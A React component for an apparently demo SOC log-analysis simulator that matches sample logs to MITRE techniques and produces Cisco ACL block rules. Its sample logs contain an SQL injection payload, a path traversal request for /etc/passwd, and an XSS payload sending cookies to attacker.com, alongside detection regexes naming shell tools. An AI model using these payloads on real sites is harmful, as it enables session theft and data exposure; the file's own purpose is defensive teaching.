import React, { useState, useMemo } from 'react';
import { 
  Play, CheckCircle2, Terminal, Zap, RefreshCw, ShieldCheck, 
  Copy, ChevronDown, ChevronUp, AlertTriangle, Shield, Sliders, Check, Lock, Search
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { soundFx } from '../utils/soundEffects';

interface DataPipelineSimulatorProps {
  darkMode: boolean;
}

interface AttackScenario {
  id: string;
  name: string;
  rawLog: string;
  detectedIp: string;
  attackType: string;
  mitreTactic: string;
  riskScore: number;
  severity: 'CRITICAL' | 'HIGH' | 'LOW';
  regexPattern: string;
  aclRule: string;
  summary: string;
}

export const DataPipelineSimulator: React.FC<DataPipelineSimulatorProps> = ({ darkMode }) => {
  const scenarios: AttackScenario[] = [
    {
      id: 'ssh-brute',
      name: 'SSH Brute-Force Attack',
      rawLog: '2026-08-07 06:14:02 auth.log: Failed password for root from 192.168.1.105 port 22 ssh2 (attempts=142)',
      detectedIp: '192.168.1.105',
      attackType: 'Credential Access (T1110)',
      mitreTactic: 'MITRE T1110.001 - Password Guessing',
      riskScore: 9.2,
      severity: 'CRITICAL',
      regexPattern: 'Failed password for (\\w+) from (\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})',
      aclRule: 'ip access-list extended BLOCK_SSH_ATTACKERS\n deny ip host 192.168.1.105 any log\n permit ip any any',
      summary: 'High-frequency failed SSH root authentications detected from suspect internal subnet 192.168.1.0/24.'
    },
    {
      id: 'sqli',
      name: 'SQL Injection Payload',
      rawLog: '2026-08-07 06:15:10 nginx.access: GET /api/users?id=1%20UNION%20SELECT%20username,password%20FROM%20admin_users 400 185.220.101.5',
      detectedIp: '185.220.101.5',
      attackType: 'Exploit Public App (T1190)',
      mitreTactic: 'MITRE T1190 - SQLi Data Exfiltration Probe',
      riskScore: 8.8,
      severity: 'CRITICAL',
      regexPattern: '(?i)(UNION\\s+SELECT|OR\\s+1=1|DROP\\s+TABLE)',
      aclRule: 'ip access-list extended BLOCK_SQLI_PROBES\n deny ip host 185.220.101.5 any log\n permit ip any any',
      summary: 'Malicious SQL UNION SELECT injection payload targeted relational user database endpoint.'
    },
    {
      id: 'xss-script',
      name: 'XSS Cross-Site Scripting',
      rawLog: '2026-08-07 06:16:22 web.log: POST /comments payload="<script>document.location=\'http://attacker.com/cookie=\'+document.cookie</script>" ip=45.33.21.110',
      detectedIp: '45.33.21.110',
      attackType: 'Client Execution (T1059)',
      mitreTactic: 'MITRE T1059.007 - JavaScript XSS Injection',
      riskScore: 6.5,
      severity: 'HIGH',
      regexPattern: '<script[\\s\\S]*?>[\\s\\S]*?<\\/script>',
      aclRule: 'ip access-list extended BLOCK_XSS_ATTACKERS\n deny ip host 45.33.21.110 any log\n permit ip any any',
      summary: 'Reflected script tag injection attempting session token & cookie theft from client.'
    },
    {
      id: 'dir-traversal',
      name: 'Directory Traversal Probe',
      rawLog: '2026-08-07 06:17:15 web.log: GET /../../../../etc/passwd HTTP/1.1 403 Forbidden ip=198.51.100.42',
      detectedIp: '198.51.100.42',
      attackType: 'File Read Probe (T1083)',
      mitreTactic: 'MITRE T1083 - File & Directory Discovery',
      riskScore: 7.9,
      severity: 'HIGH',
      regexPattern: '(\\.\\.\\/|\\.\\.\\\\|\\/etc\\/passwd)',
      aclRule: 'ip access-list extended BLOCK_TRAVERSAL_PROBES\n deny ip host 198.51.100.42 any log\n permit ip any any',
      summary: 'Path traversal attempt scanning for sensitive Linux configuration files.'
    },
    {
      id: 'clean-traffic',
      name: 'Clean HTTP Traffic',
      rawLog: '2026-08-07 06:18:00 nginx.access: GET /portfolio/projects HTTP/1.1 200 OK user_agent="Mozilla/5.0" ip=10.0.1.50',
      detectedIp: '10.0.1.50',
      attackType: 'Normal Traffic',
      mitreTactic: 'None (Authorized Session)',
      riskScore: 0.0,
      severity: 'LOW',
      regexPattern: 'GET \\/portfolio[\\w\\/-]* HTTP\\/1\\.1 200',
      aclRule: '! Traffic clean. No Router ACL containment required.',
      summary: 'Standard user GET request to portfolio route. No threat signatures matched.'
    }
  ];

  const [selectedScenarioId, setSelectedScenarioId] = useState<string>('ssh-brute');
  const [customLog, setCustomLog] = useState<string>('');
  const [isCustomMode, setIsCustomMode] = useState<boolean>(false);
  const [activeStep, setActiveStep] = useState<number>(3); // 0: Ingest, 1: RegEx, 2: SIEM Score, 3: ACL Block
  const [isSimulating, setIsSimulating] = useState<boolean>(false);
  const [copiedAcl, setCopiedAcl] = useState<boolean>(false);
  const [showDetails, setShowDetails] = useState<boolean>(false);
  const [quarantinedIps, setQuarantinedIps] = useState<Set<string>>(new Set());

  // Current active scenario or dynamically parsed custom log
  const activeScenario = useMemo(() => {
    if (!isCustomMode || !customLog.trim()) {
      return scenarios.find(s => s.id === selectedScenarioId) || scenarios[0];
    }

    // Dynamic Live Parsing Engine for Custom User Input
    const logStr = customLog.trim();
    
    // Extract IP address via IPv4 Regex
    const ipMatch = logStr.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
    const extractedIp = ipMatch ? ipMatch[0] : '192.168.1.250';

    // Threat detection heuristics
    let severity: 'CRITICAL' | 'HIGH' | 'LOW' = 'LOW';
    let riskScore = 0.0;
    let attackType = 'Unclassified Log';
    let mitreTactic = 'MITRE T1071 - Standard Application Layer';
    let regexPattern = '\\b(?:\d{1,3}\.){3}\d{1,3}\b';
    let summary = 'Live log line evaluated. No high-risk signature matched.';

    if (/failed|invalid|unauthorized|denied/i.test(logStr)) {
      severity = 'HIGH';
      riskScore = 7.4;
      attackType = 'Failed Auth / Access Violation';
      mitreTactic = 'MITRE T1110 - Brute-Force / Auth Violation';
      regexPattern = '(failed|unauthorized|denied)';
      summary = `Authentication failure detected from origin IP ${extractedIp}.`;
    }

    if (/union|select|drop|insert|script|eval|exec|select\s+from|1=1|or\s+1/i.test(logStr)) {
      severity = 'CRITICAL';
      riskScore = 9.5;
      attackType = 'Code / SQL / Script Injection';
      mitreTactic = 'MITRE T1190 - Application Exploit Payload';
      regexPattern = '(?i)(union\\s+select|script|1=1)';
      summary = `High-severity injection signature detected targeting application endpoint from ${extractedIp}.`;
    }

    if (/\.\.\/|\/etc\/passwd|cmd\.exe|\/bin\/sh/i.test(logStr)) {
      severity = 'CRITICAL';
      riskScore = 9.1;
      attackType = 'Command Execution / Path Traversal';
      mitreTactic = 'MITRE T1059 - Command Execution Probe';
      regexPattern = '(\\.\\.\\/|\\/etc\\/passwd|cmd\\.exe)';
      summary = `Path traversal or shell invocation attempt from ${extractedIp}.`;
    }

    const aclRule = severity === 'LOW' 
      ? '! Custom Log Clean. No Cisco ACL containment required.'
      : `ip access-list extended BLOCK_CUSTOM_THREAT\n deny ip host ${extractedIp} any log\n permit ip any any`;

    return {
      id: 'custom-entry',
      name: 'Custom Log Analysis',
      rawLog: logStr,
      detectedIp: extractedIp,
      attackType,
      mitreTactic,
      riskScore,
      severity,
      regexPattern,
      aclRule,
      summary
    };
  }, [selectedScenarioId, customLog, isCustomMode]);

  const isQuarantined = quarantinedIps.has(activeScenario.detectedIp);

  const handleSelectScenario = (id: string) => {
    soundFx.playCyberBlip();
    setIsCustomMode(false);
    setSelectedScenarioId(id);
    setActiveStep(3);
  };

  const handleRunSimulation = () => {
    soundFx.playSuccess();
    setIsSimulating(true);
    setActiveStep(0);

    setTimeout(() => setActiveStep(1), 250);
    setTimeout(() => setActiveStep(2), 500);
    setTimeout(() => {
      setActiveStep(3);
      setIsSimulating(false);
    }, 750);
  };

  const handleToggleQuarantine = () => {
    soundFx.playCyberBlip();
    const newSet = new Set(quarantinedIps);
    if (newSet.has(activeScenario.detectedIp)) {
      newSet.delete(activeScenario.detectedIp);
    } else {
      newSet.add(activeScenario.detectedIp);
    }
    setQuarantinedIps(newSet);
  };

  const handleCopyAcl = () => {
    soundFx.playCyberBlip();
    navigator.clipboard.writeText(activeScenario.aclRule);
    setCopiedAcl(true);
    setTimeout(() => setCopiedAcl(false), 2000);
  };

  const steps = [
    { num: '1', title: 'Syslog Ingest', badge: '185K logs/s' },
    { num: '2', title: 'RegEx Parse', badge: '1ms Match' },
    { num: '3', title: 'MITRE Triage', badge: `Score ${activeScenario.riskScore}` },
    { num: '4', title: 'Cisco ACL Contain', badge: isQuarantined ? 'Quarantined' : activeScenario.severity === 'LOW' ? 'Allowed' : 'Pending' },
  ];

  return (
    <section id="pipeline-simulator" className={`py-6 relative overflow-hidden transition-colors ${
      darkMode ? 'bg-[#0a0c10] text-slate-100' : 'bg-slate-100/80 text-slate-900'
    }`}>
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
        
        {/* Compact Main Card */}
        <div className={`rounded-2xl border p-4 sm:p-5 shadow-xl transition-all ${
          darkMode ? 'bg-[#0d1017] border-white/10' : 'bg-white border-slate-200'
        }`}>
          
          {/* Header Row */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-white/10">
            <div className="flex items-center gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center justify-center shrink-0">
                <Zap className="w-4 h-4 animate-pulse" />
              </div>
              <div>
                <h2 className="text-base sm:text-lg font-black tracking-tight leading-tight flex items-center gap-2">
                  <span>SOC SIEM Log Analyzer & Cisco Router ACL Mitigation Engine</span>
                  <span className="hidden md:inline-block px-2 py-0.5 rounded-full text-[10px] font-mono font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                    100% Precision Match
                  </span>
                </h2>
                <p className="text-xs text-slate-400">
                  Automated Python/JS RegEx parser, dynamic MITRE threat scoring, & Cisco ACL CLI mitigation
                </p>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex items-center gap-2 shrink-0 self-end sm:self-auto">
              <button
                type="button"
                onClick={handleRunSimulation}
                disabled={isSimulating}
                className="px-3.5 py-1.5 rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-bold text-xs shadow-md shadow-emerald-600/20 flex items-center gap-1.5 transition-all active:scale-95"
              >
                {isSimulating ? (
                  <>
                    <RefreshCw className="w-3.5 h-3.5 animate-spin text-emerald-200" />
                    <span>Processing...</span>
                  </>
                ) : (
                  <>
                    <Play className="w-3.5 h-3.5 text-emerald-200 fill-emerald-200" />
                    <span>Run RegEx Engine</span>
                  </>
                )}
              </button>

              <button
                type="button"
                onClick={() => {
                  soundFx.playCyberBlip();
                  setShowDetails(!showDetails);
                }}
                className={`px-3 py-1.5 rounded-xl border text-xs font-mono font-bold flex items-center gap-1.5 transition-all ${
                  showDetails 
                    ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' 
                    : darkMode ? 'bg-white/5 border-white/10 hover:bg-white/10 text-slate-300' : 'bg-slate-100 border-slate-200 hover:bg-slate-200 text-slate-700'
                }`}
              >
                <span>{showDetails ? 'Hide Console' : 'Inspect Telemetry'}</span>
                {showDetails ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
              </button>
            </div>
          </div>

          {/* Scenario Quick Selector & Live Custom Log Tester */}
          <div className="mt-3.5 space-y-3">
            
            {/* Scenario Pills */}
            <div className="flex flex-wrap items-center gap-1.5 text-xs">
              <span className="text-[10px] font-mono text-slate-400 uppercase font-bold mr-1">Sample Scenarios:</span>
              {scenarios.map((s) => {
                const isSelected = !isCustomMode && s.id === selectedScenarioId;
                return (
                  <button
                    key={s.id}
                    type="button"
                    onClick={() => handleSelectScenario(s.id)}
                    className={`px-2.5 py-1 rounded-lg font-mono text-[11px] font-bold transition-all flex items-center gap-1.5 border ${
                      isSelected
                        ? 'bg-emerald-600 text-white border-emerald-400 shadow-sm ring-1 ring-emerald-400'
                        : darkMode
                          ? 'bg-white/5 border-white/10 text-slate-400 hover:text-slate-200 hover:bg-white/10'
                          : 'bg-slate-100 border-slate-200 text-slate-600 hover:text-slate-900 hover:bg-slate-200'
                    }`}
                  >
                    <span>{s.name}</span>
                    <span className={`px-1 py-0.2 rounded text-[9px] ${
                      s.severity === 'CRITICAL' ? 'bg-rose-500/30 text-rose-200' : s.severity === 'HIGH' ? 'bg-amber-500/30 text-amber-200' : 'bg-emerald-500/30 text-emerald-200'
                    }`}>
                      {s.severity}
                    </span>
                  </button>
                );
              })}

              {/* Custom Input Mode Button */}
              <button
                type="button"
                onClick={() => {
                  soundFx.playCyberBlip();
                  setIsCustomMode(true);
                  if (!customLog) {
                    setCustomLog('2026-08-07 06:20:00 nginx.access: GET /api/admin?query=SELECT*FROM*users HTTP/1.1 403 172.16.0.88');
                  }
                }}
                className={`px-2.5 py-1 rounded-lg font-mono text-[11px] font-bold transition-all flex items-center gap-1 border ${
                  isCustomMode
                    ? 'bg-purple-600 text-white border-purple-400 ring-1 ring-purple-400'
                    : 'bg-purple-500/10 text-purple-400 border-purple-500/30 hover:bg-purple-500/20'
                }`}
              >
                <Sliders className="w-3 h-3" /> Custom Log Line Input
              </button>
            </div>

            {/* Custom Log Input Box if active */}
            {isCustomMode && (
              <div className="p-3 rounded-xl bg-purple-950/30 border border-purple-500/40 space-y-2 text-xs font-mono">
                <div className="flex items-center justify-between text-purple-300 font-bold">
                  <span>Custom Syslog / HTTP Log Input Field:</span>
                  <span className="text-[10px] text-purple-400">Evaluates live with JS RegEx engine</span>
                </div>
                <input
                  type="text"
                  value={customLog}
                  onChange={(e) => setCustomLog(e.target.value)}
                  placeholder="Paste any raw syslog string, e.g., 'Failed password for admin from 203.0.113.50 port 22'"
                  className="w-full px-3 py-2 rounded-lg bg-black/60 border border-purple-500/30 text-emerald-300 font-mono text-xs focus:outline-none focus:ring-2 focus:ring-purple-400"
                />
              </div>
            )}

            {/* Compact Horizontal Stepper */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-1">
              {steps.map((st, idx) => {
                const isActive = activeStep >= idx;
                const isCurrent = activeStep === idx;
                return (
                  <div
                    key={idx}
                    className={`p-2 rounded-xl border transition-all flex items-center justify-between gap-2 ${
                      isCurrent
                        ? 'bg-emerald-500/20 border-emerald-500/50 text-emerald-300 shadow-sm ring-1 ring-emerald-500/30'
                        : isActive
                          ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'
                          : darkMode ? 'bg-slate-950/40 border-white/5 text-slate-500' : 'bg-slate-50 border-slate-200 text-slate-400'
                    }`}
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <div className={`w-5 h-5 rounded-full font-mono font-bold text-[10px] flex items-center justify-center shrink-0 ${
                        isActive ? 'bg-emerald-500 text-slate-950' : 'bg-white/10 text-slate-500'
                      }`}>
                        {st.num}
                      </div>
                      <span className="text-xs font-bold font-mono truncate">{st.title}</span>
                    </div>
                    <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-black/20 text-emerald-400 shrink-0">
                      {st.badge}
                    </span>
                  </div>
                );
              })}
            </div>

          </div>

          {/* Collapsible Telemetry Console */}
          <AnimatePresence>
            {showDetails && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                exit={{ opacity: 0, height: 0 }}
                transition={{ duration: 0.25 }}
                className="overflow-hidden pt-4 mt-4 border-t border-white/10"
              >
                <div className={`rounded-xl border p-4 space-y-4 font-mono text-xs ${
                  darkMode ? 'bg-slate-950 border-white/10 text-slate-200' : 'bg-slate-900 border-slate-800 text-slate-200'
                }`}>
                  
                  {/* Row 1: Raw Log Stream */}
                  <div>
                    <div className="text-[10px] uppercase font-bold tracking-wider text-slate-400 mb-1 flex items-center justify-between">
                      <span className="flex items-center gap-1.5">
                        <Terminal className="w-3.5 h-3.5 text-emerald-400" />
                        Live Log Stream Ingestion
                      </span>
                      <span className="text-emerald-400 font-bold">Detected Origin IP: {activeScenario.detectedIp}</span>
                    </div>
                    <div className="p-3 rounded-lg bg-black/60 border border-white/10 text-emerald-300 break-all leading-relaxed text-[11px] font-mono shadow-inner">
                      <span className="text-slate-500 mr-2">&gt;</span>{activeScenario.rawLog}
                    </div>
                  </div>

                  {/* Row 2: RegEx Pattern & MITRE Details */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div className="p-3 rounded-lg bg-black/40 border border-white/10 space-y-1">
                      <span className="text-[10px] text-slate-400 font-bold uppercase block">RegEx Threat Pattern</span>
                      <code className="text-cyan-300 text-[11px] block truncate font-mono">{activeScenario.regexPattern}</code>
                    </div>

                    <div className="p-3 rounded-lg bg-black/40 border border-white/10 space-y-1">
                      <span className="text-[10px] text-slate-400 font-bold uppercase block">MITRE ATT&CK Classification</span>
                      <span className="text-amber-300 text-[11px] font-bold block truncate font-mono">{activeScenario.mitreTactic}</span>
                    </div>
                  </div>

                  {/* Row 3: Cisco Router ACL Output & Firewall Interactive Quarantine Toggle */}
                  <div className="space-y-1.5">
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between text-[10px] uppercase font-bold text-slate-400 gap-2">
                      <span className="flex items-center gap-1.5 text-emerald-400">
                        <ShieldCheck className="w-3.5 h-3.5" />
                        Automated Cisco IOS Router ACL CLI Policy
                      </span>
                      <div className="flex items-center gap-2">
                        <button
                          type="button"
                          onClick={handleToggleQuarantine}
                          className={`px-2.5 py-1 rounded text-[10px] font-mono font-bold flex items-center gap-1 transition-all ${
                            isQuarantined
                              ? 'bg-rose-500 text-white shadow-sm'
                              : 'bg-emerald-500/20 text-emerald-300 hover:bg-emerald-500/30'
                          }`}
                        >
                          <Lock className="w-3 h-3" />
                          {isQuarantined ? `IP ${activeScenario.detectedIp} Quarantined` : `Quarantine IP in Firewall`}
                        </button>

                        <button
                          type="button"
                          onClick={handleCopyAcl}
                          className="px-2.5 py-1 rounded bg-white/10 hover:bg-white/20 text-slate-200 font-bold flex items-center gap-1"
                        >
                          <Copy className="w-3 h-3" /> {copiedAcl ? 'Copied!' : 'Copy CLI Commands'}
                        </button>
                      </div>
                    </div>

                    <div className="p-3.5 rounded-lg bg-black/80 border border-emerald-500/30 text-emerald-400 text-xs leading-relaxed font-mono overflow-x-auto shadow-inner">
                      <pre>{activeScenario.aclRule}</pre>
                    </div>
                  </div>

                  {/* Triage Summary */}
                  <div className="p-3 rounded-lg bg-white/5 border border-white/10 text-xs text-slate-300 font-sans leading-relaxed">
                    <strong className="text-emerald-400 font-mono">SOC Triage Verdict:</strong> {activeScenario.summary}
                  </div>

                </div>
              </motion.div>
            )}
          </AnimatePresence>

        </div>

      </div>
    </section>
  );
};
